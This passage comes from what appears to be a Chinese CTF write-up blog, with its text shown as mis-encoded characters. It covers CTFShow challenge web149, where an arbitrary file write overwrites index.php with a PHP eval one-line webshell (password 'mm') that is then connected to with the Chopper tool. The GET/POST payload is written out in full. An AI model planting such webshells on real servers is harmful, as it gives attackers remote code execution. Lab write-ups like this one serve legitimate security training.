class="string">&quot;index.php&quot;</span>) &#123;</span><br><span class="line">            unlink(<span class="variable">$file</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>åˆ†æ:</strong></p>
<ul>
<li>æ ¹æ®é¢˜ç›®æç¤ºï¼šä½ å†™çš„å¿«è¿˜æ˜¯æˆ‘åˆ çš„å¿«ï¼Ÿ</li>
<li>unlink() åˆ é™¤æ–‡ä»¶çš„å‡½æ•°ã€‚$file !== index.php å¯çŸ¥è¦æƒ³ä¸æ‰§è¡Œunlink $file å¿…é¡»å¾—æ˜¯ index.php </li>
<li>ç»“åˆ : file_put_contents($_GET[â€˜ctfâ€™], $_POST[â€˜showâ€™]); å¾—çŸ¥ï¼Œfile_put_contents() å°†ä¸€ä¸ªå­—ç¬¦ä¸²å†™å…¥æ–‡ä»¶ã€‚é‚£ä¹ˆå¯å¾— ctf=index.php show=<?php @eval($_POST[mm]);?></li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">get: ?ctf=index.php</span><br><span class="line">post: show=<span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[mm]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/2021/07/26/CTFShow-PHP%E7%89%B9%E6%80%A7/web149.png"></p>
<ul>
<li>è¿™æ—¶å°±å°† index.php é‡å†™ä¸ºäº† ä¸€å¥è¯æœ¨é©¬ã€‚å†æ¬¡è®¿é—® index.php æ²¡æœ‰ä»»ä½•æ˜¾ç¤ºã€‚</li>
</ul>
<p><img src="/2021/07/26/CTFShow-PHP%E7%89%B9%E6%80%A7/web149_1.png"></p>
<ul>
<li>æ‰“å¼€èœåˆ€è¿æ¥ index.php å¯†ç : mm è¿æ¥ã€‚</li>
</ul>
<p><img src="/2021/07/26/CTFShow-PHP%E7%89%B9%E6%80%A7/web149_2.png"></p>
<h2 id="web150"><a href="#web150" class="headerlink" title="web150"></a>web150</h2><p>æ²¡åš</p>
]]></content>
      <categories>
        <category>CTFç¬”è®°</category>
      </categories>
  </entry>
</search>
